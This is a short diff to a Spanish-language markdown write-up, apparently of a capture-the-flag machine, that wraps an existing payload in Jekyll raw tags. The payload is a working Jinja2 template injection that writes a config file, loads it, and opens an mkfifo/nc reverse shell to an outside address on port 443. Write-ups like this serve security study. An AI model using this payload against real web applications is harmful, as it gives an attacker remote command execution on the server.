@@ -321,7 +321,9 @@ Corresponde a un contenedor
 Me envió una reverse shell modificando un archivo de configuración
 
 ```null
+{%raw%}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} {{ config.from_pyfile('/tmp/evilconfig.cfg') }} {{ config['RUNCMD']('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.16.7 443 >/tmp/f',shell=True) }}
+{%endraw%}
 ```
 
 En un script de ```bash``` se referencia a un directorio oculto en la raíz
